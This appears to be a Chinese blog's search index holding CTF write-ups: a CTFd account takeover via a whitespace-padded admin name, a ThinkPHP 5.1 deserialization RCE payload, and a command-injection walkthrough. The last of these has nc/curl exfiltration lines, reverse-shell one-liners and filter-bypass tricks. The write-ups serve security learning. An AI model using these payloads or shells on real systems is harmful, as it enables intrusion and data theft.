<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFd 任意账户接管</title>
    <url>/blog/CTFd-%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>由于最近在搭建CTFd平台，google的时候找到了<code>CTFd v2.0.0-v2.2.2</code>的任意账户接管漏洞<code>CVE-2020-7245</code>，正好BUUCTF上有一道CTFd的题目，Start。</p>
<a id="more"></a>

<h2 id="0x01-flag"><a href="#0x01-flag" class="headerlink" title="0x01 flag"></a>0x01 flag</h2><p><code>flag{ff2c3c0d-c5e1-4373-99aa-cbb3bbb9e983}</code></p>
<h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ol>
<li>漏洞位于<code>CTFd/auth.py</code>的register函数，注册前后处理不一致。<code>Users.query.add_columns(&#39;name&#39;, &#39;id&#39;).filter_by(name=name).first()</code>对name进行处理，<code>name=name.strip()</code>对经过空白字符过滤后的name进行处理，导致我们可以在任意账户前后加空格绕过验证，这里以admin为例子。   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    errors = get_errors()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = request.form[<span class="string">'name'</span>]</span><br><span class="line">        email_address = request.form[<span class="string">'email'</span>]</span><br><span class="line">        password = request.form[<span class="string">'password'</span>]</span><br><span class="line"></span><br><span class="line">        name_len = len(name) == <span class="number">0</span></span><br><span class="line">        names = Users.query.add_columns(<span class="string">'name'</span>, <span class="string">'id'</span>).filter_by(name=name).first()</span><br><span class="line">        emails = Users.query.add_columns(<span class="string">'email'</span>, <span class="string">'id'</span>).filter_by(email=email_address).first()</span><br><span class="line">        pass_short = len(password) == <span class="number">0</span></span><br><span class="line">        pass_long = len(password) &gt; <span class="number">128</span></span><br><span class="line">        valid_email = validators.validate_email(request.form[<span class="string">'email'</span>])</span><br><span class="line">        team_name_email_check = validators.validate_email(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid_email:</span><br><span class="line">            errors.append(<span class="string">"Please enter a valid email address"</span>)</span><br><span class="line">         ..........</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(errors) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">'register.html'</span>,</span><br><span class="line">                errors=errors,</span><br><span class="line">                name=request.form[<span class="string">'name'</span>],</span><br><span class="line">                email=request.form[<span class="string">'email'</span>],</span><br><span class="line">                password=request.form[<span class="string">'password'</span>]</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> app.app_context():</span><br><span class="line">                user = Users(</span><br><span class="line">                    name=name.strip(),</span><br><span class="line">                    email=email_address.lower(),</span><br><span class="line">                    password=password.strip()</span><br><span class="line">                )</span><br><span class="line">```   </span><br><span class="line"><span class="number">2.</span> 打开ctfd平台，用户界面只有一个admin账户，猜测是修改admin账户的密码，登录后拿到flag。  </span><br><span class="line">   ![](ctfd<span class="number">-1.</span>png)</span><br><span class="line"><span class="number">3.</span> 在[BUUOJ邮箱](http://mail.buuoj.cn/admin/ui/user/signup/mail.buuoj.cn)注册一个邮箱。通过这个邮箱去注册ctfd的加空格` admin `账户，此时user变为两个admin。  </span><br><span class="line">   ![](ctfd<span class="number">-2.</span>png)</span><br><span class="line"><span class="number">4.</span> 接下来需要找到重置密码的地方，根据auth.py文件，`/reset_password`接口可以重置密码。这里flask也是用的反序列化去获得用户名，反序列化NB。    </span><br><span class="line">   ![](ctfd<span class="number">-3.</span>png)</span><br><span class="line">```python</span><br><span class="line"><span class="meta">@auth.route('/reset_password', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="meta">@auth.route('/reset_password/&lt;data&gt;', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="meta">@ratelimit(method="POST", limit=10, interval=60)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span><span class="params">(data=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = unserialize(data, max_age=<span class="number">1800</span>)</span><br><span class="line">        <span class="keyword">except</span> (BadTimeSignature, SignatureExpired):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'reset_password.html'</span>, errors=[<span class="string">'Your link has expired'</span>])</span><br><span class="line">        <span class="keyword">except</span> (BadSignature, TypeError, base64.binascii.Error):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'reset_password.html'</span>, errors=[<span class="string">'Your reset token is invalid'</span>])</span><br></pre></td></tr></table></figure></li>
<li>这里注意邮箱账号必须是小写才能收到邮件，大写的账户收不到邮件，但是又可以注册，这里算是本人新发现的一个点，但好像并没有什么可以深入的漏洞点。<br><img src="/blog/CTFd-%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1/ctfd-4.png" alt></li>
<li>登录管理员界面，获得flag<br><img src="/blog/CTFd-%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1/ctfd-5.png" alt></li>
</ol>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>从搭建CTF的到发现已有<code>CVE-2020-7245</code>，借助BUUCTF平台正好完成一道任意账户接管漏洞题目，整理一下攻击链。</p>
<ul>
<li><code>CTFd/auth.py</code>文件的注册函数部分，添加用户名是直接用的<code>name</code>加入到数据库，但实际生成用户的时候是<code>name=name.strip(),email=email_address.lower(),password=password.strip()</code>。</li>
<li>在name前后加空格，可以注册新用户<code>admin</code>，已登录账户发起重置密码请求，实际修改的是admin的密码。</li>
<li>通过新密码登录admin账户，拿到管理权限。<br>在渗透测试的过程中，一些细小的差异点，可以是能否挖掘到漏洞的关键，例如本题的admin账户前后加空格、邮箱账号小写发送等。</li>
</ul>
]]></content>
      <categories>
        <category>N1BOOK CTF</category>
      </categories>
      <tags>
        <tag>CTFd</tag>
        <tag>CVE-2020-7245</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK thinkphp反序列化利用链</title>
    <url>/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目的环境是有问题的，我不知道是BUUCTF上的环境问题，还是说Nu1l官方的docker环境有问题。提供的源代码与环境自身的源代码不一致，导致浪费了很多时间，并且官方给的exp和wp无法对应，对于没有做过tp利用链的人来说门槛较高，还需要自己去debug，不过确实学到了很多，下面开始WP。</p>
<a id="more"></a>
<h2 id="0x01-flag"><a href="#0x01-flag" class="headerlink" title="0x01 flag"></a>0x01 flag</h2><p><code>n1book{de70641304640057390e8fabc8b515bf}</code></p>
<h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ol>
<li>访问环境时提示下载源代码<code>www.zip</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-5.png" alt> </li>
<li>下载源代码后解压缩，通过阅读readme.md发现是thinkphp 5.1版本，网上搜索后，得到<a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>，只需执行<code>php thinkphp_5.1_exp.php</code>，便可以得到payload。关于利用链的构造网上很多大神分析了，可以看[Thinkphp 5.1 反序列化利用链深入分析]，我就不分析了，重点讲下做题。(<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwNDAv" title="https://paper.seebug.org/1040/">https://paper.seebug.org/1040/<i class="fa fa-external-link"></i></span>)  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">   payload内容如下：</span><br><span class="line">   O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A8%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D</span><br><span class="line">   <span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 这里分析一下thinkphp的2个主要文件，然后分析一下[利用链thinkphp_5.1_exp.php文件](thinkphp_5.1_exp.php) </span></span><br><span class="line"><span class="string">   *  3.1 application\index\controller\index.php文件,只有请求被hello解析时，才能通过构造POST请求将payload赋值给str，实现反序列化利用。</span></span><br><span class="line"><span class="string">      `</span><span class="string">``</span>php</span><br><span class="line">      &lt;?php</span><br><span class="line">      namespace app\<span class="keyword">index</span>\controller;</span><br><span class="line"></span><br><span class="line">      class Index</span><br><span class="line">      &#123;</span><br><span class="line">         public function <span class="keyword">index</span>()</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='www.zip'&gt;download code&lt;/a&gt;"</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         public function hello()</span><br><span class="line">         &#123;</span><br><span class="line">            unserialize($_POST[<span class="string">'str'</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>3.2 route\route.php文件，压缩包源代码与实际BUUCTF服务器代码不一样。本人先在本地phpstudy搭建环境获得命令执行权限后，服务器相同url却不能获得权限，后来证实原因是路由代码不一致。<ul>
<li>压缩包代码如下  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'think'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello,ThinkPHP5!'</span>;</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'hello/:name'</span>, <span class="string">'index/hello'</span>);</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<ul>
<li>BUUCTF服务器代码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_file($_SERVER[<span class="string">"DOCUMENT_ROOT"</span>] . $_SERVER[<span class="string">"SCRIPT_NAME"</span>])) </span><br><span class="line">&#123; <span class="keyword">return</span> <span class="keyword">false</span>; &#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">"/index.php"</span>; &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li>3.3 <a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>前几行内容如下，其中<code>a</code>参数用来承载实际执行的命令。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $append = [];</span><br><span class="line">   <span class="keyword">private</span> $data = [];</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;append = [<span class="string">"a"</span>=&gt;[<span class="string">""</span>]]; </span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [<span class="string">"a"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>本机phpstudy环境下，根据源代码构造了两种url请求，以whoami为例子。第一个请求路由为<em>application\index\controller\index.php文件</em>-&gt;<em>Index类</em>-&gt;<em>hello()方法</em>，第二个请求利用了thinkphp的<span class="exturl" data-url="aHR0cHM6Ly9tLnBocC5jbi9waHBrai90aGlua3BocC80NDg0ODAuaHRtbA==" title="https://m.php.cn/phpkj/thinkphp/448480.html">兼容模式url<i class="fa fa-external-link"></i></span></li>
</ol>
<ul>
<li><code>http://{your_server}/public/index.php/index/Index/hello?a=whoami</code></li>
<li><code>http://{your_server}/public/index.php?s=index/index/hello&amp;a=whoami</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-1.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-2.png" alt></li>
</ul>
<ol start="5">
<li>介绍完本机命令执行，再来介绍BUUCTF命令执行。服务器只能用第二种请求，构造参数<code>a=cd /;ls</code>和<code>a=cd /;cat FLAG</code>，<code>str</code>的值为1中payload，通过<code>hackbar</code>或<code>burpsuite</code>发包。<br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-3.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-4.png" alt> <h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2>thinkphp 5.1的反序列化漏洞，由于thinkphp 5.1还存在RCE漏洞(漏洞触发条件是默认路由情况下，可以导致RCE)，所以这道题源代码的route.php修改了默认路由，不能直接通过RCE执行命令，只能按着出题人思路用php反序列化。<br>难点如下</li>
</ol>
<ul>
<li>找到利用点，application\index\controller\index.php文件的hello函数</li>
<li>构造正确的路由，不清楚tp路由的话，很难构造正确的路由，正确构造<code>a</code>的值，post上传<code>str</code>的payload</li>
<li>thinkphp5.1 php反序列化利用链</li>
</ul>
]]></content>
      <categories>
        <category>N1BOOK CTF</category>
      </categories>
      <tags>
        <tag>thinkphp 5.1</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 命令执行</title>
    <url>/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>详细的写了N1BOOK中命令执行题目的题解，nc、curl、server基本用法<br><br><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1slRTclQUMlQUMlRTQlQkElOEMlRTclQUIlQTAlMjB3ZWIlRTglQkYlOUIlRTklOTglQjZdJUU2JUFEJUJCJUU0JUJBJUExcGluZyVFNSU5MSVCRCVFNCVCQiVBNA==" title="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0%20web%E8%BF%9B%E9%98%B6]%E6%AD%BB%E4%BA%A1ping%E5%91%BD%E4%BB%A4">题目地址<i class="fa fa-external-link"></i></span></p>
<a id="more"></a>

<h2 id="0x01-flag"><a href="#0x01-flag" class="headerlink" title="0x01 flag"></a>0x01 flag</h2><p>n1book{6fa82809179d7f19c67259aa285a7729}</p>
<h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ol>
<li>访问环境，测试命令<code>127.0.0.1</code><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-1.png" alt></li>
<li>接着测试<code>127.0.0.1 &amp;&amp; ls</code>，这里浪费了一点时间，以为<code>&amp;&amp;</code>不能让<code>ls</code>命令执行，其实是因为浏览器将我们输入的<code>&amp;&amp;</code>转码了，导致我们的输入其实变成了<code>127.0.0.1+%26%26+ls</code><br><strong>建议以后做注入题目时，直接用burpsuite，防止注入的数据被浏览器转码</strong><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-2.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-3.png" alt></li>
<li>这里还有一个问题，虽然ip ping成功，但后面的命令不一定执行了。接着用<code>sleep 5</code>进行延时注入，发现<code>&amp;&amp;</code>命令并不能让后面的sleep命令执行，接着测试<code>%0a</code>连接符，可以让后面的sleep命令执行</li>
<li>开始猜测flag的位置，<code>flag</code>、<code>flag.php</code>、<code>flag.txt</code>等，没有找到明显的flag文件。由于没有命令执行的回显，如何找到flag文件并且将文件数据传出来是个问题，考虑<code>{flag file} | nc {your_server_ip port}</code>将数据传出来，但<code>|</code>和<code>:</code>符号被判定为恶意字符。  </li>
</ol>
<p><strong>如果没有服务器，可以用buuctf开小号，在basic/Linux labs上启动一个内网服务器</strong><br>5. <code>&gt;</code>没有被过滤，可以从服务器下载恶意脚本到本地并执行。这里使用<code>curl {your_server_ip}/ctf.sh</code>，然后准备给sh文件加执行权限，却无法添加，最后怀疑当前用户在当前目录没有保存文件的权限。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-4.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-5.png" alt><br>6. 于是将<code>ctf.sh</code>保存到<code>tmp</code>目录下。添加可执行权限。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-6.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-7.png" alt><br>7. 这里其实传了两次.sh文件，第一次的文件内容为<code>ls  | nc {your_server_ip port}</code>，得到当前目录下的文件列表，发现存在<code>/FLAG</code>文件，第二次的文件内容为<code>cat /FLAG | nc {your_server_ip port}</code>，将<code>/FLAG</code>文件内容传出来。<br>8. 在服务器上监听本地端口<code>nc -lvp 8888</code>，这里我的是8888。然后执行<code>ctf.sh</code>，得到回传的数据。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-8.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-9.png" alt></p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>命令执行主要是通过特殊字符让本不该执行的命令执行。常用的特殊字符有</p>
<ul>
<li>转义符<br><code>^</code>、<code>\</code>、<code>&amp;</code></li>
<li>连接符<br><code>&amp;&amp;</code>、<code>||</code>、<code>%0a</code>、<code>%0d</code>、<code>;</code>、<code>$()</code></li>
<li>注释符号<br><code>#</code>、<code>::</code> </li>
</ul>
<h2 id="0x04-进一步的扩宽一下难度"><a href="#0x04-进一步的扩宽一下难度" class="headerlink" title="0x04 进一步的扩宽一下难度"></a>0x04 进一步的扩宽一下难度</h2><ol>
<li>cmd可以会过滤空格，可以用其他字符绕过</li>
</ol>
<ul>
<li>%09、%0b、%0c、$IFS$9  </li>
</ul>
<ol start="2">
<li>黑名单绕过  </li>
</ol>
<ul>
<li>字符串拼接，<code>a=c;b=at;c=he;d=llo;$a$b ${c}${d}</code>为cat hello</li>
<li>字符串截取，substr</li>
</ul>
<ol start="3">
<li><code>nc、curl</code>命令的使用，<code>&gt;、|</code>重定向符的使用</li>
<li>常用反弹shell</li>
</ol>
<ul>
<li>攻击者服务器监听8888端口，nc -lvp 8888</li>
<li>受害者1 <code>bash -i &gt;&amp; /dev/tcp/{server_ip}/8888 0&gt;&amp;1</code></li>
<li>受害者2 <code>nc -e /bin/sh {server_ip} 8888</code></li>
</ul>
]]></content>
      <categories>
        <category>N1BOOK CTF</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK Writeup</title>
    <url>/blog/N1BOOK-Writeup/</url>
    <content><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>一直想为开源社区贡献一点东西，趁着这段时间有机会，决定把<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz" title="https://buuoj.cn/challenges">BUUCTF<i class="fa fa-external-link"></i></span>的题刷一下。主要是重新回顾一下WEB、N1BOOK和REAL部分的题，积累相关测试经验，如果能够帮助到其他人，也算是没白写Writeup。<br><br>项目地址<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUA==" title="https://github.com/Jason1314Zhang/BUUCTF-WP">BUUCTF-WP<i class="fa fa-external-link"></i></span>，如果觉得做得可以的话可以Fork，欢迎提PR。</p>
<a id="more"></a>
<h2 id="做题情况"><a href="#做题情况" class="headerlink" title="做题情况"></a>做题情况</h2><h3 id="1-N1BOOK"><a href="#1-N1BOOK" class="headerlink" title="1. N1BOOK"></a>1. N1BOOK</h3><ol>
<li>WEB入门<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hd57KX5b+D55qE5bCP5p2OLm1k" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]粗心的小李.md">粗心的小李<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hd5bi46KeB55qE5pCc6ZuGLm1k" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]常见的搜集.md">常见的搜集<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hdc3Fs5rOo5YWlLTEubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]sql注入-1.md">sql注入-1<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hdc3Fs5rOo5YWlLTIubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]sql注入-2.md">sql注入-2<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hdYWZyLTEubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]afr-1.md">afr-1<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hdYWZyLTIubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]afr-2.md">afr-2<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuIDnq6AlMjB3ZWLlhaXpl6hdYWZyLTMubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第一章%20web入门]afr-3.md">afr-3<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
<li>WEB进阶<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuoznq6AlMjB3ZWLov5vpmLZdWFNT6Zev5YWzLm1k" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第二章%20web进阶]XSS闯关.md">XSS闯关<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuoznq6AlMjB3ZWLov5vpmLZd5paH5Lu25LiK5LygLm1k" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第二章%20web进阶]文件上传.md">文件上传<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vTjFCT09LL1vnrKzkuoznq6AlMjB3ZWLov5vpmLZdU1NSRiUyMFRyYWluaW5nLm1k" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/[第二章%20web进阶]SSRF%20Training.md">SSRF training<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
</ol>
<h3 id="2-WEB"><a href="#2-WEB" class="headerlink" title="2. WEB"></a>2. WEB</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vV0VCL1tCSkRDVEYyMDIwXUVhc3klMjBNRDUubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/WEB/[BJDCTF2020]Easy%20MD5.md">BJDCTF2020 Easy MD5<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phc29uMTMxNFpoYW5nL0JVVUNURi1XUC9ibG9iL21haW4vV0VCL1vmnoHlrqLlpKfmjJHmiJglMjAyMDE5XVNlY3JldCUyMEZpbGUubWQ=" title="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/WEB/[极客大挑战%202019]Secret%20File.md">极客大挑战 2019 Secret File<i class="fa fa-external-link"></i></span></li>
</ul>
<h3 id="3-REAL"><a href="#3-REAL" class="headerlink" title="3. REAL"></a>3. REAL</h3>]]></content>
      <categories>
        <category>N1BOOK CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯游戏安全竞赛2020PC方向初赛</title>
    <url>/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>2018年因为找工作的原因，和同学一起参加过游戏安全竞赛，比赛比较有趣，就一直想再参加一次。2019年为什么不参加？当时已经准备读研了，感觉没有参加的必要，所以今年想着再参加一次。<br><br><strong>赛制：</strong>分为初赛和决赛<br><br><strong>方向：</strong>PC、Android、ML、NLP<br><br><a href="PC客户端方向初赛赛题.zip">PC赛题下载</a></p>
<a id="more"></a>

<h1 id="0x01-PC赛题"><a href="#0x01-PC赛题" class="headerlink" title="0x01 PC赛题"></a>0x01 PC赛题</h1><p>PC初赛赛题包含两个题，ring0和ring3，分别分析内核态和用户态的程序。ring3题是一道签到题，ring0题需要双机调试（时间不够，没做出来，太菜了）</p>
<ol>
<li>ring3 扫雷exe程序和一段内存dump</li>
<li>ring0 一款有问题的驱动程序</li>
</ol>
